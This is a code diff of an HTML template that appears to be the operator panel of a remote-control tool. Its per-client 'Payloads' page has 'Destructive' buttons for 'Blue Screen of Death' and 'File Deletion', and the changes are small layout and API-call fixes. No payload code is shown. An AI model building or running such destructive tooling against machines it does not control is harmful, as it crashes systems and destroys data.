@@ -16,7 +16,7 @@
       <h1>Payloads</h1>
       <nav>
         <ol class="breadcrumb">
-          <li class="breadcrumb-item"><a href="index.html">Home</a></li>
+          <li class="breadcrumb-item"><a href="/">Home</a></li>
           <li class="breadcrumb-item">Client - {{ client }}</li>
           <li class="breadcrumb-item active">Payloads</li>
         </ol>
@@ -25,7 +25,7 @@
 
     <section class="section">
       <div class="row">
-        <div class="col-lg-6">
+        <div class="col-lg-12">
 
           <div class="card">
             <div class="card-body">
@@ -36,7 +36,7 @@
                 <button type="button" class="list-group-item list-group-item-action disabled active" aria-current="true">
                   Destructive
                 </button>
-                <button type="button" class="list-group-item list-group-item-action" onclick="callApi('{{client}}', 'test')">Blue Screen of Death</button>
+                <button type="button" class="list-group-item list-group-item-action" onclick="callAPI('test')">Blue Screen of Death</button>
                 <button type="button" class="list-group-item list-group-item-action">File Deletion</button>
                 <button type="button" class="list-group-item list-group-item-action">A fourth button item</button>
               </div><!-- End List group with Links and buttons -->
@@ -91,26 +91,14 @@
 
 <script type="text/javascript">
 
-function callAPI(client, payload) {
+function callAPI(payload) {
   var xhr = new XMLHttpRequest();
   xhr.open("POST", '/api/payload/exec', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.send(JSON.stringify({
-      "client": client,
+      "client": '{{client}}',
       "payload": payload
   }));
-
-  // shit
-
-//   let data = {element: "barium"};
-
-// fetch("/post/data/here", {
-//   method: "POST",
-//   headers: {'Content-Type': 'application/json'}, 
-//   body: JSON.stringify(data)
-// }).then(res => {
-//   console.log("Request complete! response:", res);
-// });
 }
 
 </script>
